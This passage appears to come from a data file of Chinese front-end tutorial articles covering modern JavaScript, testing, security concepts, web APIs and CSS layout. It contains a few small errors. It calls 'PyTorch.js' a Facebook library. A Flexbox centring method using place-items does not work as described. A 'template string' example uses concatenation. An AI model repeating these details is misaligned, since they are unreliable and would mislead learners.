createUser({ name: 'Alice' }); // { name: 'Alice', age: 0 }

// 必需参数
function required(paramName) {
  throw new Error(\`Parameter \${paramName} is required\`);
}

function createUser(name = required('name'), age) {
  return { name, age };
}
// createUser(); // Error: Parameter name is required
\`\`\`

**剩余参数和扩展运算符：**
剩余参数（...args）将多余的参数收集为数组，扩展运算符（...）将数组或对象展开。这两个特性让函数参数处理和数据操作更加灵活。

\`\`\`javascript
// 剩余参数
function sum(...numbers) {
  return numbers.reduce((total, n) => total + n, 0);
}
sum(1, 2, 3, 4, 5); // 15

// 剩余参数必须是最后一个参数
function log(level, ...messages) {
  console.log(\`[\${level}]\`, ...messages);
}
log('INFO', 'User', 'logged in'); // '[INFO] User logged in'

// 扩展运算符 - 数组
const arr1 = [1, 2, 3];
const arr2 = [4, 5, 6];
const merged = [...arr1, ...arr2]; // [1, 2, 3, 4, 5, 6]

// 复制数组
const copy = [...arr1];

// 扩展运算符 - 对象
const obj1 = { a: 1, b: 2 };
const obj2 = { c: 3, d: 4 };
const mergedObj = { ...obj1, ...obj2 }; // { a: 1, b: 2, c: 3, d: 4 }

// 覆盖属性
const config = { timeout: 1000, retry: 3 };
const customConfig = { ...config, timeout: 2000 }; // { timeout: 2000, retry: 3 }

// 函数调用中使用扩展
const numbers = [1, 2, 3];
Math.max(...numbers); // 3
Math.max.apply(null, numbers); // ES5 方式

// 类数组转数组
const nodeList = document.querySelectorAll('div');
const nodes = [...nodeList];

// 字符串转数组
const chars = [...'hello']; // ['h', 'e', 'l', 'l', 'o']
\`\`\`

**类：**
- 类语法糖
- 继承
- 静态方法
- 私有方法（ES2022）

**模块：**
- import 和 export
- 模块化开发

### ES7 (ES2016) 及以后的特性

**ES7：**
- 指数运算符：**
- Array.prototype.includes()

**ES8 (ES2017)：**
- async/await
- Object.values() 和 Object.entries()
- String.prototype.padStart() 和 padEnd()

**ES9 (ES2018)：**
- 异步迭代器
- Rest/Spread 属性
- 正则表达式改进

**ES10 (ES2019)：**
- Array.prototype.flat() 和 flatMap()
- String.prototype.trimStart() 和 trimEnd()
- Object.fromEntries()

**ES11 (ES2020)：**
- Optional Chaining：?.
- Nullish Coalescing：??
- BigInt
- Dynamic Import

**ES12 (ES2021)：**
- Logical Assignment Operators：&&=, ||=, ??=
- Numeric Separators：1_000_000
- String.prototype.replaceAll()

**ES13 (ES2022)：**
- Top-level await
- Private fields and methods
- Class static blocks

### 最佳实践

**代码风格：**
- 使用 let 和 const 代替 var
- 优先使用箭头函数
- 使用模板字符串
- 合理使用解构赋值

**性能考虑：**
- 避免过度使用扩展运算符
- 合理使用 async/await
- 注意 BigInt 的性能

**兼容性：**
- 使用 Babel 转译
- 了解目标环境的支持情况
- 使用 polyfill

**可读性：**
- 保持代码简洁
- 使用有意义的变量名
- 适当的注释

**安全性：**
- 注意模板字符串的注入风险
- 避免使用 eval
- 合理使用 Optional Chaining

### 实际应用

**前端开发：**
- 组件开发
- 状态管理
- 异步操作
- 工具函数

**Node.js 开发：**
- 服务器端代码
- API 开发
- 脚本编写
- 工具开发

**代码示例：**

\`\`\`javascript
// 使用箭头函数和模板字符串
const greet = name => "Hello, " + name + "!";

// 使用解构赋值
const { name, age } = user;

// 使用 async/await
async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error:', error);
  }
}

// 使用 Optional Chaining
const username = user?.profile?.name;

// 使用 Nullish Coalescing
const value = input ?? 'default';
\`\`\`

### 学习资源

- MDN Web Docs
- ECMAScript 规范
- JavaScript.info
- 前端技术博客
- 开源项目源码`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-testing",title:"JavaScript 测试策略与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","测试","Jest","单元测试"],content:`## JavaScript 测试策略与最佳实践

测试是保证代码质量的重要手段，JavaScript 有丰富的测试工具和框架。

### 测试类型

**单元测试：**
- 测试单个函数或组件
- 隔离测试
- 快速反馈

**集成测试：**
- 测试多个组件或模块的交互
- 模拟真实场景
- 验证功能完整性

**端到端测试：**
- 测试整个应用流程
- 模拟用户操作
- 验证用户体验

**性能测试：**
- 测试代码性能
- 识别性能瓶颈
- 确保性能符合要求

**安全测试：**
- 测试代码安全性
- 识别安全漏洞
- 确保代码安全

### 测试工具

**测试框架：**
- Jest：Facebook 开发，功能丰富：Jest是Facebook开发的JavaScript测试框架，与React项目完美集成，提供零配置、快照测试、模拟功能等特性，Jest支持并行测试、代码覆盖率报告，是前端单元测试的行业标准，支持TypeScript、Babel、Webpack等工具链
- Mocha：灵活，可定制性强
- Jasmine：BDD 风格
- Vitest：Vite 生态，快速：Vitest是基于Vite的测试框架，提供与Jest兼容的API，利用Vite的ES模块支持实现极快的测试启动速度，Vitest支持TypeScript、JSX、快照测试、模拟功能，是Vite生态中的测试工具，适合现代前端项目

**断言库：**
- Chai：支持多种断言风格
- Jest 内置断言
- Node.js 内置 assert

**测试工具：**
- React Testing Library：React 组件测试
- Testing Library：通用组件测试
- Cypress：端到端测试
- Playwright：端到端测试，支持多浏览器：Playwright是Microsoft开发的端到端测试框架，支持Chrome、Firefox、Safari、Edge等所有现代浏览器，提供跨浏览器测试能力，Playwright支持自动等待、网络拦截、截图、视频录制等高级功能，API设计简洁，支持TypeScript，是现代E2E测试的首选工具

**模拟工具：**
- Sinon：函数模拟和间谍
- Jest 内置模拟
- MSW：API 模拟

### 测试策略

**测试覆盖率：**
- 语句覆盖率：执行了多少语句
- 分支覆盖率：执行了多少分支
- 函数覆盖率：执行了多少函数
- 行覆盖率：执行了多少行

**测试组织：**
- 按模块组织测试
- 按功能组织测试
- 测试文件名与被测试文件对应

**测试编写：**
- 描述清晰的测试用例
- 测试边界情况
- 测试错误处理
- 保持测试独立

**测试执行：**
- 本地执行测试
- CI/CD 执行测试
- 并行执行测试
- 缓存测试结果

### 最佳实践

**测试设计：**
- 测试行为而非实现
- 保持测试简洁
- 避免测试依赖
- 模拟外部依赖

**测试维护：**
- 定期运行测试
- 修复失败的测试
- 更新测试以适应代码变化
- 移除过时的测试

**测试与开发：**
- 测试驱动开发 (TDD)
- 行为驱动开发 (BDD)
- 持续集成
- 持续部署

**性能考虑：**
- 避免缓慢的测试
- 合理使用测试超时
- 并行执行测试
- 缓存测试结果

### 实际应用

**前端测试：**
- 组件测试
- 状态管理测试
- 工具函数测试
- API 调用测试

**Node.js 测试：**
- 服务端测试
- API 测试
- 中间件测试
- 数据库操作测试

**测试示例：**

// 单元测试示例
const { sum } = require('./math');

test('sum adds two numbers', () => {
  expect(sum(1, 2)).toBe(3);
});

test('sum handles negative numbers', () => {
  expect(sum(-1, -2)).toBe(-3);
});

test('sum handles zero', () => {
  expect(sum(0, 0)).toBe(0);
});

// React 组件测试示例
import { render, screen, fireEvent } from '@testing-library/react';
import Button from './Button';

test('Button renders with text', () => {
  render(<Button>Click me</Button>);
  expect(screen.getByText('Click me')).toBeInTheDocument();
});

test('Button calls onClick when clicked', () => {
  const handleClick = jest.fn();
  render(<Button onClick={handleClick}>Click me</Button>);
  fireEvent.click(screen.getByText('Click me'));
  expect(handleClick).toHaveBeenCalledTimes(1);
});

### 学习资源

- Jest 文档
- Testing Library 文档
- Cypress 文档
- 测试驱动开发书籍
- 前端测试实践博客`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-security",title:"JavaScript 安全最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","安全","XSS","CSRF"],content:`## JavaScript 安全最佳实践

安全是 JavaScript 开发的重要考虑因素，以下是一些关键的安全最佳实践。

### 常见安全问题

**XSS (跨站脚本攻击)：**
- 攻击者注入恶意脚本
- 窃取用户数据或会话
- 重定向用户到恶意网站

**CSRF (跨站请求伪造)：**
- 攻击者诱导用户执行非预期操作
- 如修改密码、转账等
- 利用用户的认证状态

**SQL 注入：**
- 攻击者注入 SQL 语句
- 访问或修改数据库
- 可能导致数据泄露

**敏感数据暴露：**
- 硬编码 API 密钥
- 在前端存储敏感数据
- 未加密传输数据

**依赖漏洞：**
- 使用有漏洞的依赖包
- 未及时更新依赖
- 依赖链攻击

### 防护措施

**XSS 防护：**
- 对用户输入进行验证和清理
- 使用 Content-Security-Policy (CSP)
- 避免使用 dangerouslySetInnerHTML
- 使用 React 等框架的内置转义

**CSRF 防护：**
- 使用 CSRF 令牌
- 验证 Origin 和 Referer 头
- 使用 SameSite Cookie 属性
- 实现正确的 CORS 策略

**SQL 注入防护：**
- 使用参数化查询
- 避免拼接 SQL 语句
- 使用 ORM 框架
- 最小权限原则

**敏感数据保护：**
- 不在前端存储敏感数据
- 使用 HTTPS 传输数据
- 加密敏感数据
- 使用环境变量管理配置

**依赖安全：**
- 定期更新依赖
- 使用 npm audit 检查漏洞
- 配置 dependabot 自动更新
- 使用 Snyk 等安全工具

### 安全编码实践

**输入验证：**
- 对所有用户输入进行验证
- 使用正则表达式验证格式
- 限制输入长度
- 过滤特殊字符

**输出编码：**
- 对输出进行 HTML 编码
- 对 JSON 数据进行正确处理
- 避免直接拼接 HTML

**密码处理：**
- 使用 bcrypt 等算法哈希密码
- 实现密码强度检查
- 支持多因素认证
- 定期提醒用户更新密码

**会话管理：**
- 使用安全的会话存储
- 设置合理的会话过期时间
- 实现会话刷新机制
- 处理会话劫持

**错误处理：**
- 不暴露详细的错误信息给用户
- 记录错误日志
- 实现统一的错误处理
- 避免信息泄露

### 安全工具和监控

**安全工具：**
- ESLint 安全插件
- Snyk：依赖安全扫描
- OWASP ZAP：安全测试
- Burp Suite：安全测试

**监控和日志：**
- 监控异常行为
- 记录安全相关事件
- 实现入侵检测
- 定期安全审计

**安全响应：**
- 建立安全响应流程
- 及时处理安全漏洞
- 发布安全补丁
- 通知用户安全事件

### 最佳实践

**安全意识：**
- 培训开发团队的安全意识
- 定期进行安全培训
- 建立安全编码规范
- 进行安全代码审查

**安全架构：**
- 分层安全设计
- 最小权限原则
- 防御纵深
- 安全默认配置

**合规性：**
- 遵守 GDPR、CCPA 等法规
- 保护用户隐私
- 实现数据保护措施
- 定期合规审计

**持续改进：**
- 定期进行安全评估
- 学习最新的安全威胁
- 更新安全措施
- 参与安全社区`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-ai",title:"JavaScript 与人工智能的结合",category:"javascript",difficulty:"hard",tags:["JavaScript","AI","Machine Learning","TensorFlow.js"],content:`## JavaScript 与人工智能的结合

JavaScript 正在成为人工智能和机器学习的重要平台，特别是在前端和边缘计算领域。

### JavaScript AI 生态系统

**TensorFlow.js：**
- Google 开发的机器学习库
- 支持在浏览器和 Node.js 中运行
- 预训练模型和自定义模型

**PyTorch.js：**
- Facebook 开发的机器学习库
- 支持在浏览器中运行 PyTorch 模型
- 动态计算图

**ml5.js：**
- 基于 TensorFlow.js 的高级库
- 简化机器学习的使用
- 适合教育和原型开发

**Brain.js：**
- 轻量级神经网络库
- 支持各种神经网络类型
- 易于使用的 API

### 应用场景

**计算机视觉：**
- 图像分类
- 物体检测
- 面部识别
- 姿态估计

**自然语言处理：**
- 情感分析
- 文本分类
- 命名实体识别
- 机器翻译

**语音识别：**
- 语音转文本
- 说话人识别
- 语音合成

**推荐系统：**
- 个性化推荐
- 协同过滤
- 内容过滤

**强化学习：**
- 游戏 AI
- 机器人控制
- 资源优化

### 实现方式

**预训练模型：**
- 使用现成的预训练模型
- 减少训练时间和资源
- 适合快速原型开发

**模型转换：**
- 将 Python 训练的模型转换为 JavaScript
- 使用 TensorFlow.js Converter
- 支持 ONNX 格式

**浏览器内训练：**
- 在浏览器中训练模型
- 利用用户设备的计算能力
- 保护用户隐私

**边缘计算：**
- 在客户端运行模型
- 减少服务器负载
- 提高响应速度

### 性能优化

**模型优化：**
- 模型量化
- 模型压缩
- 模型蒸馏

**推理优化：**
- WebAssembly 加速
- WebGL 加速
- SIMD 指令

**加载优化：**
- 模型懒加载
- 模型缓存
- 渐进式加载

**内存管理：**
- 合理使用内存
- 释放不再使用的模型
- 避免内存泄漏

### 最佳实践

**用户体验：**
- 提供加载状态
- 处理模型加载失败
- 优化推理速度
- 提供降级方案

**隐私保护：**
- 本地处理数据
- 避免发送敏感数据到服务器
- 明确的隐私政策

**兼容性：**
- 检测浏览器支持
- 提供降级方案
- 测试不同设备

**开发流程：**
- 原型设计
- 模型选择
- 性能测试
- A/B 测试

### 实际应用

**前端应用：**
- 实时图像识别
- 语音助手
- 个性化内容
- 交互式学习

**Node.js 应用：**
- 服务器端推理
- 数据处理
- 自动化工具
- 推荐系统

**物联网：**
- 边缘设备 AI
- 传感器数据分析
- 智能控制

**游戏开发：**
- NPC 行为
- 游戏平衡
- 玩家分析

### 学习资源

- TensorFlow.js 文档
- ml5.js 文档
- JavaScript AI 教程
- 开源项目示例
- 在线课程`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-web-apis",title:"JavaScript Web APIs 深度解析",category:"javascript",difficulty:"medium",tags:["JavaScript","Web APIs","DOM","Fetch"],content:`## JavaScript Web APIs 深度解析

Web APIs 是浏览器提供的一组接口，使 JavaScript 能够与浏览器和操作系统交互。

### DOM API

**DOM 操作：**
- 选择元素：querySelector、querySelectorAll
- 创建元素：createElement、createTextNode
- 修改元素：appendChild、removeChild、replaceChild
- 属性操作：setAttribute、getAttribute、removeAttribute

**事件处理：**
- 事件监听：addEventListener、removeEventListener
- 事件类型：click、input、scroll、resize
- 事件对象：event.target、event.preventDefault、event.stopPropagation
- 事件委托：利用事件冒泡

**DOM 遍历：**
- 父节点：parentNode、parentElement
- 子节点：childNodes、children
- 兄弟节点：nextSibling、previousSibling、nextElementSibling、previousElementSibling

**DOM 样式：**
- style 属性：element.style.property
- classList：add、remove、toggle、contains
- getComputedStyle：获取计算后的样式

### Fetch API

**基本用法：**
- fetch() 函数：返回 Promise
- 请求配置：method、headers、body、mode
- 响应处理：response.json()、response.text()、response.blob()

**请求类型：**
- GET：获取资源
- POST：提交数据
- PUT：更新资源
- DELETE：删除资源
- PATCH：部分更新

**错误处理：**
- 网络错误：Promise 拒绝
- HTTP 错误：需要手动检查 status
- 超时处理：AbortController

**高级特性：**
- 跨域请求：CORS
- 认证：headers、credentials
- 缓存：cache 选项
- 重定向：redirect 选项

### 存储 API

**localStorage：**
- 持久存储
- 最大容量约 5MB
- 字符串键值对
- 同源策略

**sessionStorage：**
- 会话存储
- 标签页关闭后清除
- 最大容量约 5MB
- 字符串键值对

**IndexedDB：**
- 结构化存储
- 较大容量
- 异步 API
- 支持索引

**Cookie：**
- 小型文本文件
- 自动发送到服务器
- 最大容量约 4KB
- 过期时间控制

### 其他常用 Web APIs

**地理位置 API：**
- navigator.geolocation
- getCurrentPosition：获取当前位置
- watchPosition：监视位置变化

**通知 API：**
- Notification 构造函数
- requestPermission：请求权限
- 发送桌面通知

**媒体 API：**
- MediaDevices：访问摄像头和麦克风
- MediaRecorder：录制媒体
- AudioContext：音频处理

**Web Workers：**
- 后台线程
- 避免阻塞主线程
- 消息传递
- 适合计算密集型任务

**Service Workers：**
- 网络代理
- 离线缓存
- 推送通知
- 后台同步

**Web Sockets：**
- 双向通信
- 实时数据
- 低延迟
- 适合聊天、游戏等

### 最佳实践

**性能优化：**
- 减少 DOM 操作
- 使用事件委托
- 合理使用存储
- 优化网络请求

**兼容性：**
- 检测 API 支持
- 提供降级方案
- 使用 polyfill

**安全性：**
- 验证用户输入
- 防止 XSS
- 保护存储数据
- 使用 HTTPS

**代码组织：**
- 模块化 API 调用
- 错误处理
- 响应式设计
- 可访问性

### 实际应用

**前端应用：**
- 表单处理
- 数据可视化
- 实时通信
- 离线功能

**交互体验：**
- 拖拽功能
- 键盘导航
- 触摸事件
- 动画效果

**工具开发：**
- 浏览器扩展
- 开发工具
- 性能分析工具

**PWA (渐进式 Web 应用)：**
- 离线访问
- 安装到主屏幕
- 推送通知
- 后台同步`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-box-model",title:"CSS 盒模型深度解析",category:"css",difficulty:"easy",tags:["CSS","盒模型","布局基础"],content:`## CSS 盒模型深度解析

CSS 盒模型是网页布局的基础，理解盒模型对于掌握 CSS 布局至关重要。

### 📦 盒模型的组成

**标准盒模型：**
- **content**：内容区域，显示文本和图像
- **padding**：内边距，内容与边框之间的空间
- **border**：边框，围绕内边距的线
- **margin**：外边距，边框外部的空间

**盒模型的计算：**
- **标准盒模型：width = content width**
- **IE 盒模型：width = content + padding + border**
- **box-sizing 属性控制盒模型类型**

**box-sizing 属性：**
- **content-box**：标准盒模型（默认值）
- **border-box**：IE 盒模型，更直观的尺寸计算
- **inherit**：继承父元素的值

### 💻 代码示例：盒模型对比

\`\`\`css
/* 标准盒模型（默认） */
.box-standard {
  box-sizing: content-box;
  width: 300px;
  padding: 20px;
  border: 5px solid #000;
  /* 实际占用宽度 = 300 + 20*2 + 5*2 = 350px */
}

/* IE 盒模型 */
.box-border {
  box-sizing: border-box;
  width: 300px;
  padding: 20px;
  border: 5px solid #000;
  /* 实际占用宽度 = 300px（包含 padding 和 border） */
  /* 内容宽度 = 300 - 20*2 - 5*2 = 250px */
}
\`\`\`

#### 全局设置 border-box

\`\`\`css
/* 推荐的全局设置 */
*,
*::before,
*::after {
  box-sizing: border-box;
}

/* 这样所有元素都使用 border-box，计算更直观 */
.container {
  width: 100%;
  padding: 20px;
  border: 1px solid #ccc;
  /* 实际宽度就是 100%，padding 和 border 包含在内 */
}
\`\`\`

#### 外边距折叠示例

\`\`\`css
/* 相邻兄弟元素的外边距折叠 */
.box1 {
  margin-bottom: 20px;
}

.box2 {
  margin-top: 30px;
  /* 实际间距 = max(20px, 30px) = 30px，不是 50px */
}

/* 防止外边距折叠的方法 */
.parent {
  margin-top: 20px;
  padding-top: 1px; /* 方法1：添加 padding */
  border-top: 1px solid transparent; /* 方法2：添加 border */
  overflow: hidden; /* 方法3：创建 BFC */
  display: flex; /* 方法4：使用 flex 布局 */
}

.child {
  margin-top: 30px;
  /* 现在不会折叠，总间距 = 20px + 30px = 50px */
}
\`\`\`

### 最佳实践

- 统一使用 border-box 盒模型
- 理解 margin 的折叠行为
- 合理使用 padding 和 margin
- 注意百分比值的计算基准
- 使用开发者工具调试盒模型`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-flexbox",title:"Flexbox 弹性布局详解",category:"css",difficulty:"medium",tags:["CSS","Flexbox","弹性布局"],content:`## Flexbox 弹性布局详解

Flexbox（弹性盒子布局）是 CSS3 引入的一维布局模型，专门用于处理元素在容器中的排列、对齐和分布。

### Flexbox 基础概念

**Flex 容器和项目：**
- display: flex 创建 Flex 容器
- 容器的直接子元素成为 Flex 项目
- 主轴（main axis）和交叉轴（cross axis）

**主轴方向：**
- flex-direction: row（默认值，水平从左到右）
- flex-direction: row-reverse（水平从右到左）
- flex-direction: column（垂直从上到下）
- flex-direction: column-reverse（垂直从下到上）

**换行控制：**
- flex-wrap: nowrap（默认值，不换行）
- flex-wrap: wrap（允许换行）
- flex-wrap: wrap-reverse（反向换行）

### 主轴对齐

**justify-content 属性：**
- flex-start：项目向主轴起点对齐
- flex-end：项目向主轴终点对齐
- center：项目在主轴上居中
- space-between：项目均匀分布，首尾贴边
- space-around：项目均匀分布，周围有空间
- space-evenly：项目均匀分布，间距相等

### 交叉轴对齐

**align-items 属性（单行）：**
- stretch（默认值）：项目拉伸填充容器
- flex-start：项目向交叉轴起点对齐
- flex-end：项目向交叉轴终点对齐
- center：项目在交叉轴上居中
- baseline：项目基线对齐

**align-content 属性（多行）：**
- stretch（默认值）：行拉伸填充容器
- flex-start：行向交叉轴起点对齐
- flex-end：行向交叉轴终点对齐
- center：行在交叉轴上居中
- space-between：行均匀分布
- space-around：行均匀分布，周围有空间

### Flex 项目属性

**flex-grow：**
- 定义项目的放大比例
- 默认值为 0，不放大
- 值为 1 时，项目占据剩余空间

**flex-shrink：**
- 定义项目的缩小比例
- 默认值为 1，空间不足时缩小
- 值为 0 时，项目不缩小

**flex-basis：**
- 定义项目在分配多余空间之前的初始大小
- 可以是长度值或 auto
- 优先级高于 width/height

**flex 简写：**
- flex: flex-grow flex-shrink flex-basis
- flex: 1 表示 flex: 1 1 0%
- flex: auto 表示 flex: 1 1 auto

### 代码示例

#### 水平垂直居中

\`\`\`css
/* 方法1：最常用的居中方式 */
.center-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* 方法2：使用 margin: auto */
.center-container {
  display: flex;
  height: 100vh;
}

.center-item {
  margin: auto;
}

/* 方法3：使用 place-items（简写） */
.center-container {
  display: flex;
  place-items: center;
  height: 100vh;
}
\`\`\`

#### 三栏布局（两边固定，中间自适应）

\`\`\`css
.container {
  display: flex;
  height: 100vh;
}

.sidebar-left {
  width: 200px;
  flex-shrink: 0; /* 防止缩小 */
  background-color: #f5f5f5;
}

.main-content {
  flex: 1; /* flex-grow: 1, flex-shrink: 1, flex-basis: 0% */
  background-color: #fff;
}

.sidebar-right {
  width: 250px;
  flex-shrink: 0; /* 防止缩小 */
  background-color: #f5f5f5;
}

/* 响应式：小屏幕时改为单列 */
@media (max-width: 768px) {
  .container {
    flex-direction: column;
  }

  .sidebar-left,
  .sidebar-right {
    width: 100%;
  }
}
\`\`\`

#### 等高布局

\`\`\`css
.card-container {
  display: flex;
  gap: 20px;
}

.card {
  flex: 1;
  /* align-items: stretch 是默认值，所以卡片会自动等高 */
  padding: 20px;
  border: 1px solid #ddd;
}

/* 即使卡片内容高度不同，所有卡片也会等高 */
\`\`\`

### 最佳实践

- 优先使用 Flexbox 进行一维布局
- 合理使用 flex 简写属性
- 注意浏览器兼容性（IE10+）
- 结合媒体查询实现响应式布局
- 避免过度嵌套 Flex 容器
- 使用 flex: 1 实现自适应布局
- 使用 gap 属性设置间距（现代浏览器）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-grid",title:"CSS Grid 网格布局详解",category:"css",difficulty:"medium",tags:["CSS","Grid","网格布局"],content:`## CSS Grid 网格布局详解

CSS Grid（网格布局）是 CSS 最强大的二维布局系统，可以同时处理行和列，创建复杂的网页布局。

### Grid 基础概念

**Grid 容器和项目：**
- display: grid 创建 Grid 容器
- 容器的直接子元素成为 Grid 项目
- 网格线（grid line）、网格轨道（grid track）、网格单元（grid cell）

**定义网格：**
- grid-template-columns：定义列
- grid-template-rows：定义行
- 可以使用长度、百分比、fr 单位、repeat() 函数

**fr 单位：**
- 分数单位，表示剩余空间的比例
- 1fr 占据一份剩余空间
- 可以与其他单位混合使用

### 代码示例

#### 圣杯布局

\`\`\`css
.container {
  display: grid;
  min-height: 100vh;
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
  grid-template-columns: 200px 1fr 200px;
  grid-template-rows: auto 1fr auto;
  gap: 20px;
}

.header {
  grid-area: header;
  background-color: #333;
  color: white;
  padding: 20px;
}

.sidebar {
  grid-area: sidebar;
  background-color: #f5f5f5;
  padding: 20px;
}

.main {
  grid-area: main;
  background-color: #fff;
  padding: 20px;
}

.aside {
  grid-area: aside;
  background-color: #f5f5f5;
  padding: 20px;
}

.footer {
  grid-area: footer;
  background-color: #333;
  color: white;
  padding: 20px;
}

/* 响应式：小屏幕时改为单列 */
@media (max-width: 768px) {
  .container {
    grid-template-areas:
      "header"
      "main"
      "sidebar"
      "aside"
      "footer";
    grid-template-columns: 1fr;
    grid-template-rows: auto;
  }
}
\`\`\`

#### 响应式卡片网格

\`\`\`css
.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  padding: 20px;
}

.card {
  background-color: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
  transition: transform 0.3s, box-shadow 0.3s;
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: 0 4px 8px rgba(0,0,0,0.15);
}

/* auto-fit 会自动根据容器宽度调整列数 */
/* minmax(300px, 1fr) 确保每列最小 300px，最大平分剩余空间 */
\`\`\`

### 最佳实践

- 二维布局优先使用 Grid
- 一维布局使用 Flexbox
- 结合两者使用（Grid 布局，Flexbox 对齐）
- 使用 grid-template-areas 提高可读性
- 注意浏览器兼容性（现代浏览器支持良好）
- 使用 fr 单位实现弹性布局
- 使用 minmax() 实现响应式
- 使用 gap 属性设置间距`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-position",title:"CSS 定位机制详解",category:"css",difficulty:"medium",tags:["CSS","定位","position"],content:`## CSS 定位机制详解

CSS 定位允许你控制元素在页面上的位置，是布局的重要工具。理解定位机制对于创建复杂的布局至关重要。

### 定位类型

**static（默认值）：**
- 正常文档流定位
- 不受 top、right、bottom、left 影响
- 元素按照 HTML 顺序排列

**relative：**
- 相对定位，相对于元素在正常文档流中的位置
- 不脱离文档流，保留原位置空间
- 使用 top、right、bottom、left 进行偏移

**absolute：**
- 绝对定位，相对于最近的定位祖先元素
- 脱离文档流，不保留原位置空间
- 如果没有定位祖先，相对于初始包含块（通常是视口）

**fixed：**
- 固定定位，相对于视口
- 脱离文档流
- 滚动时保持位置不变

**sticky：**
- 粘性定位，相对和固定的混合
- 在阈值之前是相对定位，之后是固定定位
- 需要指定 top、right、bottom 或 left

### 代码示例

#### 模态框实现

\`\`\`css
/* 模态框遮罩 */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s, visibility 0.3s;
}

.modal-overlay.active {
  opacity: 1;
  visibility: visible;
}

/* 模态框内容 */
.modal {
  position: relative;
  width: 90%;
  max-width: 600px;
  max-height: 90vh;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  overflow-y: auto;
  transform: translateY(-20px);
  transition: transform 0.3s;
}

.modal-overlay.active .modal {
  transform: translateY(0);
}

.modal-header {
  padding: 20px;
  border-bottom: 1px solid #eee;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.modal-title {
  margin: 0;
  font-size: 20px;
  font-weight: 600;
}

.modal-close {
  background: none;
  border: none;
  font-size: 24px;
  cursor: pointer;
  color: #999;
  transition: color 0.3s;
}

.modal-close:hover {
  color: #333;
}

.modal-body {
  padding: 20px;
}

.modal-footer {
  padding: 20px;
  border-top: 1px solid #eee;
  display: flex;
  justify-content: flex-end;
  gap: 10px;
}
\`\`\`

#### 固定导航栏

\`\`\`css
/* 固定定位：固定导航栏 */
.navbar {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  height: 60px;
  background-color: #333;
  color: white;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 20px;
}

/* 需要为 body 添加 padding-top，避免内容被遮挡 */
body {
  padding-top: 60px;
}

/* 返回顶部按钮 */
.back-to-top {
  position: fixed;
  bottom: 20px;
  right: 20px;
  width: 50px;
  height: 50px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 50%;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
  z-index: 1000;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s, visibility 0.3s;
}

.back-to-top.visible {
  opacity: 1;
  visibility: visible;
}
\`\`\`

### 最佳实践

- 优先使用 Flexbox 和 Grid 布局
- 定位用于特殊场景（弹出层、固定元素）
- 合理使用 z-index，避免过大值
- 注意定位对文档流的影响
- 测试不同屏幕尺寸下的表现
- 使用语义化的 HTML 结构
- 为固定元素预留空间（padding-top）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-responsive",title:"响应式设计与媒体查询",category:"css",difficulty:"medium",tags:["CSS","响应式","媒体查询","移动端"],content:`## 响应式设计与媒体查询

响应式设计是现代网页开发的标准实践，确保网站在不同设备和屏幕尺寸上都能良好显示。

### 媒体查询基础

**基本语法：**
- @media media-type and (media-feature) { ... }
- 媒体类型：screen、print、speech、all
- 媒体特性：width、height、orientation 等

**常用媒体特性：**
- min-width：最小宽度
- max-width：最大宽度
- min-height：最小高度
- max-height：最大高度
- orientation：方向（portrait/landscape）
- aspect-ratio：宽高比

**逻辑运算符：**
- and：同时满足多个条件
- not：否定媒体查询
- only：仅适用于特定媒体类型
- ,（逗号）：或关系

### 代码示例

#### 移动优先策略

\`\`\`css
/* 移动优先：从小屏幕开始，逐步增强 */
.container {
  width: 100%;
  padding: 10px;
}

/* 平板 */
@media (min-width: 768px) {
  .container {
    width: 750px;
    margin: 0 auto;
    padding: 20px;
  }
}

/* 桌面 */
@media (min-width: 1024px) {
  .container {
    width: 970px;
  }
}

/* 大屏桌面 */
@media (min-width: 1200px) {
  .container {
    width: 1170px;
  }
}
\`\`\`

#### 响应式导航栏

\`\`\`css
/* 基础样式 */
.navbar {
  background-color: #333;
  color: white;
  padding: 1rem 2rem;
}

.nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  max-width: 1200px;
  margin: 0 auto;
}

.nav-brand {
  font-size: 1.5rem;
  font-weight: bold;
}

.nav-menu {
  display: flex;
  list-style: none;
  margin: 0;
  padding: 0;
  gap: 2rem;
}

.nav-menu li a {
  color: white;
  text-decoration: none;
  transition: color 0.3s;
}

.nav-menu li a:hover {
  color: #007bff;
}

/* 汉堡菜单按钮（默认隐藏） */
.nav-toggle {
  display: none;
  background: none;
  border: none;
  color: white;
  font-size: 1.5rem;
  cursor: pointer;
}

/* 平板和手机 */
@media (max-width: 768px) {
  .nav-toggle {
    display: block;
  }

  .nav-menu {
    position: absolute;
    top: 100%;
    left: 0;
    right: 0;
    background-color: #333;
    flex-direction: column;
